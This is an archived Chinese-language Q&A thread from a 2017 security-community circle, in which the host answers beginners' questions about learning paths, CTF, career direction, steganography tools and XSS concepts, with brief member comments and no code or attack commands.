<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不高效主要一是对系统资源调度要一直后台在访问，有时候可能触发对方网站反爬虫机制，还有即使维护了也有登陆失败等情况，所以请问cos对于扫描器相对环境不复杂的场景中会话改如何维护有什么建议吗？是直接不维护根据用户输入的headers判断失效时间，如果时间长就不维护，时间短就一直访问这样可以吗？感谢感谢！

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不高效主要是我一直在访问维护，即使一直访问还会出现登录失败等情况，请问cos对于一款扫描器来说如果要实现登录扫描这种不太复杂的场景下，实现登录扫描会话维护有什么好的建议吗

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 你得说你用什么编程语言来实现这个。

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Python..

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: Cookie维护你用的什么库

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: Requests

<img src="https://file.xiaomiquan.com/bd/87/bd872d6bf8f2e37a8687398bc1bc0af07f9b896fc43c3663a77f830db1ac4c5c.jpg" width="25px"/> __ken🐜__: 小象学院有爬虫的课


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> 夏 提问：
请问如何用好学好安全技能树？是按照顺序学习么？


这是我的技能树，你不一定要都学，要知道我耗了10年才沉淀了这么点，但你都想学，10年后，这些技能就都过时了。

所以，参考之，借鉴之，走出自己的路。



...

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 太中肯了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> Aodongq1n 提问：
玄哥，我目前在一家网络安全和云计算的公司做软件测试工作，平时的工作内容主要是做桌面虚拟化基于业务的自动化测试工作，个人想通过半年的工作之外的时间完善自己的知识技能，明天年初去寻找一份开发的工作，个人对安全不是很熟悉，但是希望以技能树为一个路线走下去，我是去年毕业的，之前也在一家小公司做过linux的后台开发，现在熟悉c和ruby，最后想问下玄哥，就我目前这种情况和未来的规划，能否给一些建议？谢谢了


建议也不好给，但既然下定决心，就坚持，坚持这东西往往是最有挑战的，别只是口头说说，或者空想。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> 慕风 提问：
余弦大大，我们学校没有信息安全专业，之前也没有相关的社团或者兴趣小组，这一块的整体实力都很弱。
我大一，上学期加入了一个由大二学长组成的新兴的网络安全小组，但差不多都是小白，我凭着一个小菜的实力就成了副组长。
暑假要带着大家一起学习，但我清楚自己的水平，感觉压力很大，不过动力也十足。
我想从这一届起能在学校把这一块儿做好，但没有经验，不知道后期该怎么安排，我现在只能想到带着大家一起学习，然后打打ctf，争取拿奖，有点名气，才好继续发展，然后呢，我就有些迷茫了。感觉ctf只能是暂时性的。
而且大家都不积极，平时群里基本没动静，没有学习氛围。
恳请大大指点一下方向，也传授一下关于带队的一些经验。


关于 CTF，可以看我前面的回答。

团队不积极，无所谓，不用试图去照顾一个不积极的人，以后毕业了，海阔天空，各有千秋。看远点，不要因为这个迷茫。

至于带队经验，首先记住一句话：兵熊熊一个，将熊熊一窝。如果你自己不够强悍，怎么带队？



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> [§] 提问：
余大大，我想请教一下：我想用Python写一个可以批量检测图片是否隐藏了其他东西的工具，包括检测出使用的是何种隐写术，不知道这个想法能否实现，若可以实现，需要掌握哪些隐写术，可否提供一些参考资料学习学习。谢谢！


这个好问题，可惜我们没实战过，思路倒是可以去看看都有哪些隐写技术，知己知彼，比如 Freebuf 搜下隐写，好些文章。



...

<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[GitHub - Owlz/stegoVeritas: Yet another Stego Tool](https://github.com/Owlz/stegoVeritas)



<img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 
[图片隐写术总结 – 850's Blog](http://850.world/2017/04/12/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/#comment-4)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: Great

<img src="https://file.xiaomiquan.com/8b/f8/8bf8ed658903935055a1d9bc9b13cb9ff0ed77f145e07625f80765a1cc1da9c0.jpg" width="25px"/> __[§]__ replies to <img src="https://file.xiaomiquan.com/53/d4/53d41a6bbe6cdc75e6cae97b4f98f74831772e6ce4086d2328d85cf643266f56.jpg" width="25px"/> __空白__: 谢谢！学习学习


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> 匿名用户 提问：
弦哥，请问在对服务器日志以及流量信息进行安全审计的时候，一般的步骤是怎样的？是使用wireshark这种工具进行人工审计，还是有更专门的工具可以自动从日志和流量中发现受到了什么攻击？


为什么不看我发布的安全技能树呢？……



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> Crushmyr 提问：
余弦大大，想问下，Web安全方面，实习能明显提高自己的能力吗？
或者这样问，去什么类型公司或者什么类型的工作更能提升自己？
还有就是这样的实习需要什么要求，或者说安全技能表至少要掌握多少？


我不了解你，没法帮你判断，关键看你最感兴趣什么职业方向，你可以看各大公司的招聘，里面已经列了需求，那些就是你要去掌握的技能。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-07:

> 匿名用户 提问：
有推荐的暗网网站吗？


为什么不认真看我发布的安全技能树呢？顺藤摸瓜，也总能发现不少。



...

<img src="https://file.xiaomiquan.com/23/09/23091c17d1fee9990569279ef5daed0ec260736405e8e9a9619dcb084a4d09d8.jpg" width="25px"/> __小后__: 技能树可以看成一本武功秘籍，但是大多数人不能依步骤学下来

<img src="https://file.xiaomiquan.com/3c/0b/3c0b02829861461c8df15db4e05dcab7d2cc8e292a8c00f08834927d4894a1d3.jpg" width="25px"/> __泰迪熊__ replies to <img src="https://file.xiaomiquan.com/23/09/23091c17d1fee9990569279ef5daed0ec260736405e8e9a9619dcb084a4d09d8.jpg" width="25px"/> __小后__: 但可以先浏览一遍，找一些对自己有用的和感兴趣的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 掉到鱼缸里的猫 提问：
余弦大大，我想问一下您觉得ctf的练习，在整个学习过程中应该放在一个什么样的位置？
我现在大二，身边好多同学都狂热于ctf，但是我看技能树和其他一些安全和渗透方面的资料和教程，感觉和ctf的差别很大，和同学一起也做过一些ctf的题，感觉很浮躁，机制只是浅尝辄止就要做下一道了，感觉收获的并不是很多。


如果未来想把 CTF 当作职业，那就一直玩不断玩，毕竟是职业。

如果不是把 CTF 当职业，玩几场还是有意义的，能拿个好名次更好了，几年前我带队伍去打了场，团队拿了个冠军，小伙们因为打这个突击沉淀了不少好技能。而更早年还没 CTF 概念，我们玩的是黑客过关挑战，也挺有意思。但毕竟不是职业，玩玩就够了，因为我们得把绝大部分精力放到能成为我们职业的东西上。

所以这个问题的关键点是，你先把哪个细分领域作为职业。看看网上各大安全公司的招聘就知道，安全领域的职业还是好些的。

顺便提一个，比如有人因为 CTF 拿了某比赛的世界冠军，不代表他就是第一黑客，因为细分领域实在太多，只能说他至少是 CTF 这个职业领域里的佼佼者。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
本科毕业后进入某大型互联网公司作为安全开发几年了。渐渐发现日常的工作已经完全没法提高自己。现在搞不清自己的职业规划，也感觉目前没法找到一个可以长期发展的安全方向。请问能否提供下一般安全研发的发展方向，以及是安全上未来有哪些靠谱的方向？谢谢哈


安全技能树我感觉值得你参考下。至于未来靠谱方向：

云安全、大数据安全、移动安全、AI 安全、物联网安全、网络空间安全、...

其实我们可以先看哪个行业起来了，安全是附属品，也会跟着起来。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 还有多看看暗网，很多未来苗头会首先出现在暗网这种人性阴暗的地方。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不过暗网也别过看，学坏了就不好了😶

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 暗网里有些网站好变态啊 儿童性……还有专业的贩毒网站……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 所以...

<img src="https://file.xiaomiquan.com/da/f9/daf9bf31ff47982c17560484c5c64407d5a4248f08e5b2a7f35a4193c00d7beb.jpg" width="25px"/> __骛游__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 目前团队从事的大数据安全，大部分时候都在做多数据源的联合展示。我觉得大数据安全作为一个突破口，还需要更多安全开发算法通吃的人才


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 请添加备注 提问：
看公众号得知大佬开小密圈，相信一定有很多收获，没多想就关注了。进来发现还有些不太了解，想了解一下这个小密圈的使用方法，主要是做一些答疑，还是干货文章的分享，或者还是其他？还有这些主要是余弦大佬自己来做，还是也会有其他大佬一起来？


目前我影分身，今晚空闲些，集中发车...



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 大真HitBuddy 提问：
弦哥好，刚才粗粗的看了一下你们的技能表，感觉知识非常繁复，作为一个成熟的黑客是都要掌握，作为我们这种想要入门的小白，从哪方面先入手会比较适合呢？我目前大四，大学学的图像处理，对java熟一点，python,html都只有最基本的了解，安全方面更是一点都不懂了，目前在一家大数据公司工作，做的数据抽取清洗工作，不知道能不能给个学习路径建议？另外，线下培训希望能考虑下杭州😂😂


学习路径这种，真不好意思，给不了...



...

<img src="https://file.xiaomiquan.com/a3/4d/a34df59466f00566c8420d49b675e6ca205d7a5d170684235b6c9db9a6e11ed9.jpg" width="25px"/> __大真HitBuddy__: 哈哈哈，好久之前的提问😂😂那个时候还没有资源出来所以有点迷茫…现在资源多的忙不过来，就按资源慢慢学习了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/a3/4d/a34df59466f00566c8420d49b675e6ca205d7a5d170684235b6c9db9a6e11ed9.jpg" width="25px"/> __大真HitBuddy__: 酷😏

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 杭州的加1


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 罗卜卜卜卜卜卜 提问：
弦哥，我现在基础也有点了，就是不是很牢固。每次测试都是用扫描器扫一下，发现没什么漏洞就无从下手了，该怎么提高啊？谢谢😭


赶紧脱离“扫描器工程师”的身份，了解你有机会接触到的每个漏洞机制，并精通一门保值编程语言。



...

<img src="https://file.xiaomiquan.com/42/2a/422a6ac40779c62128d0181af33000a7a7ce7cc022c8baeb3d1b58fa660ca4d5.jpg" width="25px"/> __罗卜卜卜卜卜卜__: 谢谢弦哥，我还以为翻不到我的牌了呢。😁


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦哥好，为了切换职业方向我学了python。加上一直以来对信安方面都比较感兴趣，想问问弦哥基于python入门信安的话是不是一个好的选择？如果想要进一步深入需不需要学习C或C++？


是个好选择，你能力足精力够，C类语言也可以吃透，很保值，精力再够的话，其他保值语言，如：Java、JavaScript、PowerShell、GO 都可以学...



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 深蓝 提问：
你好，我一直在从事linux系统版本开发，也在知道做过运维，也接触了解很多政府的项目，关于安全，我反而觉得除了提供安全的机制，更重要的是如何引导用户提升安全的意识，不然没有自我的安全管理理念，一切都是空谈，另外除了web安全，在IT基础架构上还有那些更好的提升方式？


你的想法是对的。

然后看看这个：从Google白皮书看企业安全最佳实践


[从Google白皮书看企业安全最佳实践](http://mp.weixin.qq.com/s/j4mRush9uP-mR8hFbFevQw)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> zz小子 提问：
请问如果要自己做一套黑客工具难吗？需要学什么知识。


不难，比如学会 Python，找个顺眼的开源项目（安全技能树里列了很多），依葫芦画瓢，慢慢就会有感觉了。



...

<img src="https://file.xiaomiquan.com/b8/77/b8776f7d3ce9106e867038e9e861c0cfa2f0f3e72bf88a6964856e747de20088.jpg" width="25px"/> __zz小子__: 嗯嗯，最近在学js和python，想着先自己做个网站，慢慢摸透了再进一步去学xss什么的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
想学习有关域渗透的一些资料，windows域 08/12/WIN10安全检测及bypass，挺说还有linux域，感觉在这方面很欠补，毕竟环境接触的少，网上说的都模棱两可，大多不可行，弄的晕头转向，想权威体质的学习一下


安全技能树里推荐了不少，如果你真想感受，首先得“坏”。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
想学习有关域渗透的一些资料，windows域 08/12/WIN10安全检测及bypass，挺说还有linux域，感觉在这方面很欠补，毕竟环境接触的少，网上说的都模棱两可，大多不可行，弄的晕头转向，想权威体质的学习一下


安全技能树里推荐了不少，如果你真想感受，首先得“坏”。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
工具黑客，或者说脚本小子，怎样再进一步，感觉遇到了瓶颈


编程提升。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大，请问下目前安全圈跟现在很火的人工智能有什么结合点比较有前景的吗？你作为行业里面的资深专家，关于两者的结合有比较看好的未来发展方向吗？目前在学习机器学习方面的东西，还希望能得到指点


我也看重这个结合的未来，攻防领域很多应该都可以，尤其是涉及到需要大量运行、大量计算、大量样本的场景下。

我最近在写一个 XSS 漏洞 fuzzing 框架，就在琢磨如何融入 AI，就这么小的一个点，如果真融入好了，我会很兴奋。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
【第一次用小密圈-学习要多交流】大学毕业前认真学习了网络（路由交换这一块），考了CCNP；毕业去乙方做了2年多web安全，从开始的Owasp top 10，到业务逻辑漏洞挖掘，再到现在自学二进制，总感觉自己学得都是“术”层面的东西，没有太多自己的想法与见解，看了web前端黑客技术揭秘，看到很多精彩的fuzzing，很受鼓舞，希望加强这方面的能力，cos有什么建议或者以后我可以试着往哪个方向尝试？


这种建议不好给的，关键是你真想做什么。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
大大，请问做安全是适合大四直接去实习还是适合考研呢？


这个问题关键看你。



...

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 不知道我的见解对不对。高校对于网络安全方面的教育，大多数的重点都在理论上，而理论重点又在密码学。我某985网络安全专业，实战课几乎没有，反而有很多数论，密码学相关知识，我们攻不下一个网站，但是都可以手写RSA加解密算法。我想学习安全，更想挖掘一个漏洞攻下一个网站吧。所以我认为，安全实战的话，还是不要读研了，直接工作吧。这只是我目前阶段的一点拙见，也可能一叶障目不见泰山，因为毕竟还没经历过。

<img src="https://file.xiaomiquan.com/ec/3a/ec3af602567da6c4e18c636d29f3f2079423710b48eb36caba3455ce97202dac.jpg" width="25px"/> __无__: 哈哈，没事，谢谢你了😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 其实研究生也可以，实战机会完全可以在课堂外做


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
wombie attack无需联网、无需交互实现攻击的原理是什么？


这个得请 GeekPwn 的人来解答了...



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余大大，你之前提过的给我们搞个梯子的，这个项目有做吗？本人用的linode自己搭的shadowsocks，挺快的（每月10刀不算贵也不算便宜）。担心哪天会挂，希望有个备用，或者关于梯子有没有其他建议？


现在我提供这个，明天估计就会被请去喝茶...



...

<img src="https://file.xiaomiquan.com/dd/16/dd166adba8bd26eb050bea7cbfa1b2b8a91aec04a71249b8e6d98be3f90a57eb.jpg" width="25px"/> __gurisras__: 
[古斯塔斯隧道](http://t.cn/Ras7iHf)



<img src="https://file.xiaomiquan.com/f0/f6/f0f66b119f5eb710067da849ddb3645cbe2894aaa1e6acf93804b5b562ee3db9.jpg" width="25px"/> __麦__ replies to <img src="https://file.xiaomiquan.com/dd/16/dd166adba8bd26eb050bea7cbfa1b2b8a91aec04a71249b8e6d98be3f90a57eb.jpg" width="25px"/> __gurisras__: 有邀请码吗

<img src="https://file.xiaomiquan.com/1f/94/1f94da2eeb0dc62d310f71b39b6c7bc6763324ffce638c47ee4573c61e04475a.jpg" width="25px"/> __溯流__ replies to <img src="https://file.xiaomiquan.com/dd/16/dd166adba8bd26eb050bea7cbfa1b2b8a91aec04a71249b8e6d98be3f90a57eb.jpg" width="25px"/> __gurisras__: 需要邀请码呢 大兄弟


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 5u9ar 提问：
余大大，想请教一下，对于二进制类的漏洞挖掘，这类技术公开的学习资料少，能找到的也只是一些nday和fuzz payload去间接的学习，想问的是这类技术应该如何入门比较好呢？


《有趣的二进制》



...

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 这本书买来看了下，很不错，谢谢余神推荐。想追问一句  win平台的process monitor在mac linux有类似的工具吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 一下没想起来，也许可以了解下 OSSEC


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> kthemis 提问：
cos有没有玩过wifiphisher,我在树莓派上做了kali，但是每次跑起来到网络扫描阶段两块网卡就同时断开连接了。配置和安装以及启动都是按git上的文档来的。两块网卡一块是8187另一块是ar9271


还没这样玩过。你可以考虑给官方提交给issue？



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
目前来说，有没有可能利用web安全技术，在手机上实现非交互式(或者一次点击)的获取物理地址。
有什么方案吗？


暂无非交互。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余老师，有没有安全培训机构推荐一个？


这种推荐是要负责任的，万一什么原因坑了，我岂不是很尴尬？



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
弦哥，咱们分享的利器只是介绍怎么安装？还是要除了介绍安装还简单介绍一下用途以及入门级的教程？希望介绍一下后者，否则只给了工具也不会用😁😁


难道你不会看这些工具的官方文档么？



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大，我可以不可以把beef理解为一个网络探针，并顺便有着浏览器漏洞利用工具的一个框架


可以。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
能不能把xss'or圈子那个的精华技巧同步过这边来？


之前说过，不会及时同步，但迟早会分享出来。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
在xss的时候，输出的内容在html中，这时候可以用html实体编码来替换< >;  如果把< > 事先转译了，浏览器就不会解析了，会把左右接括号原样输出到页面，这是html 自解码机制，能否详细说下自解码原理，原样输出尖括号而又不执行？ 多谢！


如果你买过我曾经的那本书，里面正好提到了自解码机制。但你的问题实在太模糊，我无从再深入回答。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦大大好，我是一名大四的学生马上就要毕业了，大四期间在一家安全公司做了差不多一年的实习，web安全方向，感觉技术上提升不是很大，感觉自己技术还是不行，但思想开拓了不少，对于像我这样的要进入社会的您有什么意见？顺便问一下，您的团队还招人吗？招人的话有什么要求？


如果你能坚定未来5年想成为的角色，比如 Web 安全真的就是你最喜欢的？你会为了一个漏洞彻夜调试？你会为了一个漏洞牺牲整个周末十一长假过年长假，就为了吃透这个漏洞？

先回答这些问题，再问，否则我又不是你，不知道你真正的内心是如何的，对吧？

我团队暂无招人计划，如果有也是要符合我发布的那份安全技能树的至少50%感觉吧，不过也不一定，如果招非技术岗位，那就不用这样了...



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余大  能否推荐一款windows上用的稳定的反向socks代理工具？开源的也行


你可以先看看安全技能树里推荐的端口转发那些内容，看看是否有你需要的。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

> 匿名用户 提问：
余弦老师，请问您如何看待现在的入侵检测技术已经很成熟，也有很多检测web注入攻击的技术被提出，但web注入攻击的误报率、漏报率仍然很高的问题？


没感觉很成熟呀，在各种动态复杂场景下，所谓的“智能”、“自学习”、“下一代”都难以适应，别看宣传做得那么好，漏误报一直是很大的问题。但再深入思考下，其实这些防御或检测“智能”水平相当情况下，这种攻防平衡目的倒是达到了。

未来如果 AI 真能在这样的场景下发挥好，会是很大的机会，可是真的懂 AI 又懂安全的人有几个呢？🙂



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-06:

对了，顺祝本圈明天高考的未来黑客考试顺利。基础不牢地动山摇，别被浮躁的圈子影响了自己当年想成为真正黑客的初心。



...

